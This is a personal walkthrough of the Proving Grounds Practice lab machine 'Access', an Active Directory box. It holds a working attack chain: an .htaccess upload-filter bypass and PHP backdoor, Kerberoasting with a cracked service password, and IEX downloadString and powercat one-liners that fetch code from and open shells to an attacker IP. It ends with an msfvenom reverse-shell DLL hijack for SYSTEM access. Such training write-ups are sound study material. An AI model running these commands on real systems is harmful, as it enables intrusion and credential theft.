---
Date: 2024-11-04
Platform: PG-Practice
Category: Active Directory
Difficulty: Intermediate
Status: Complete
IP: 192.168.230.187
Writeup: https://medium.com/@Dpsypher/proving-grounds-practice-access-b95d3146cfe9
Writeup2: https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d
---
## Improved skills
- PHP bypasses
- Windows PrivEsc
- SeManageVolume Privilege Abuse
## Used tools
- nmap
- python
- powershell

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -vvv -oN access.nmap 192.168.230.187
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
80/tcp    open  http             syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49668/tcp open  unknown          syn-ack ttl 125
49673/tcp open  unknown          syn-ack ttl 125
49674/tcp open  unknown          syn-ack ttl 125
49677/tcp open  unknown          syn-ack ttl 125
49704/tcp open  unknown          syn-ack ttl 125
49791/tcp open  unknown          syn-ack ttl 125
```
---
# Enumeration

## Port 53 - DNS
No enumeration conducted
## Port 80 - HTTP (H2 Database)
- Navigated to `http://192.168.196.187:80`, viewed source and identified `TheEvent v4.6.0` (No exploits found)
![[Pasted image 20241104194928.png]]
![[Pasted image 20241104195745.png]]
- Opened Wappalyzer and identified `PHP 8.0.7`, `Windows Server` and `Apache HTTP Server 2.4.48`
![[Pasted image 20241104195052.png]]
- Identified Contact form and attempted to send test message - received "Error: Unable to load the "PHP Email Form" Library!"
![[Pasted image 20241104195410.png]]
- Ran `gobuster dir -u http://192.168.196.187 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap` - identified `/assets`, `/forms`, `/uploads`.
![[Pasted image 20241104204543.png]]
- Returned to browser and identified file upload facility through "Buy Tickets" - created & uploaded `uploadtest.txt`
![[Pasted image 20241104205538.png]]
- Navigated to `192.168.196.187/uploads/uploadtest.txt`
![[Pasted image 20241104205703.png]]
## Port 88 - Kerberos
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` and identified username `administrator@access.offsec`
![[Pasted image 20241104202233.png]]
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Names/names.txt -v` - no results
![[Pasted image 20241104202623.png]]
- Ran `./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -v` - identified users `administrator` and `server`
![[Pasted image 20241104210731.png]]
![[Pasted image 20241104210923.png]]
## Port 135 - MSRPC (Windows RPC)
No enumeration conducted
## Port 139 & 445 - SMB
- Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.196.187`
![[Pasted image 20241104200723.png]]
## Port 389/636/3268 - LDAP
- Ran `sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.196.187` - identified domain `access.offsec`
![[Pasted image 20241104201051.png]]
---
# Exploitation
## Arbitary File Upload
Ran `echo "AddType application/x-httpd-php .bypass" > .htaccess` to allow new filename `.bypass` and uploaded `.htaccess` to target
![[Pasted image 20241104210326.png]]
- Renamed `simple-backdoor.php` to `simple-backdoor.bypass` and uploaded
![[Pasted image 20241104210532.png]]
- Navigated to `http://192.168.196.187/uploads/simple-backdoor.bypass?cmd=whoami` and achieved code execution on target
![[Pasted image 20241104210639.png]]
- Generated PHP reverse shell to connect back to Attacker IP
![[Pasted image 20241104212007.png]]
- Saved PHP reverse shell as `php-reverse.bypass`, then uploaded to target.
![[Pasted image 20241104211516.png]]
- Started netcat listener on port `1234` then navigated to `http://192.168.196.187/uploads/php-reverse.bypass` and caught reverse shell
![[Pasted image 20241104212156.png]]
---
# Lateral Movement to user
## Local Enumeration
- Ran `whoami /priv`
![[Pasted image 20241104212942.png]]
- Ran `systeminfo` - identified `Windows Server 2019` `Build 17763` on `x64`
![[Pasted image 20241104213150.png]]
- Uploaded `winpeasx64.exe` and ran on target
![[Pasted image 20241105120710.png]]
- Identified vulnerabilities with `Watson`
![[Pasted image 20241105122244.png]]
- Identified unquoted autorun binaries with spaces
![[Pasted image 20241105121653.png]]
![[Pasted image 20241105121733.png]]
- Uploaded `Get-SPN.ps1` and ran on target - identified 
![[Pasted image 20241105123023.png]]
- Ran `Add-Type -AssemblyName System.IdentityModel` and `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'`
![[Pasted image 20241105123802.png]]
## Lateral Movement vector
- Served `Invoke-Kerberoast.ps1` via Python3 server then ran: `iex(new-object net.webclient).downloadString('http://192.168.45.178:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat` for `svc_mssql` ticket hash
![[Pasted image 20241105130904.png]]
- Reformatted and saved hash to local host as `msql.hash`
![[Pasted image 20241105131312.png]]
- Ran `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSQL.hash` and cracked hash for credential `trustno1`
![[Pasted image 20241105132120.png]]
- Uploaded `Invoke-RunasCs.ps1`, started netcat listener on port `5555` then ran `Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1');powercat -c 192.168.45.178 -p 5555 -e cmd"` for reverse shell as `svc_mssql` - caught reverse shell as `svc_mssql`
![[Pasted image 20241105135714.png]]
- Ran `type C:\Users\svc_mssql\Desktop\local.txt` to print local flag `d075a9b799bbf34764ed55ccd797108d`
![[Pasted image 20241105135834.png]]
---
# Privilege Escalation
## Local Enumeration
- Ran `whoami /priv` and identified `SeManageVolumePrivilege` - vulnerable to [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)
![[Pasted image 20241105141646.png]]
## Privilege Escalation vector
- Served `SeManageVolumeExploit.exe` via python and ran `iwr -uri http://192.168.45.178/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe`
![[Pasted image 20241105141841.png]]
- Ran `icacls C:\Windows\System32` - identified full privileges to `C:Windows\System32`
![[Pasted image 20241105142826.png]]
- Ran `msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=6666 -f dll -o tzres.dll` to create reverse shell in `tzres.dll` and uploaded to `C:\Windows\System32\wbem` 
![[Pasted image 20241105143036.png]]
- Started netcat listener on port `6666` and ran `systeminfo` on target to trigger reverse shell - caught reverse shell as `nt authority`
![[Pasted image 20241105143154.png]]
![[Pasted image 20241105143238.png]]
- Ran `type C:\Users\Administrator\Desktop\proof.txt` to print proof flag `46e76431490ebf8ccc7c112f112fcfc2`
![[Pasted image 20241105143348.png]]
---
# Trophy & Loot
`local.txt` = `d075a9b799bbf34764ed55ccd797108d`
`proof.txt` = `46e76431490ebf8ccc7c112f112fcfc2`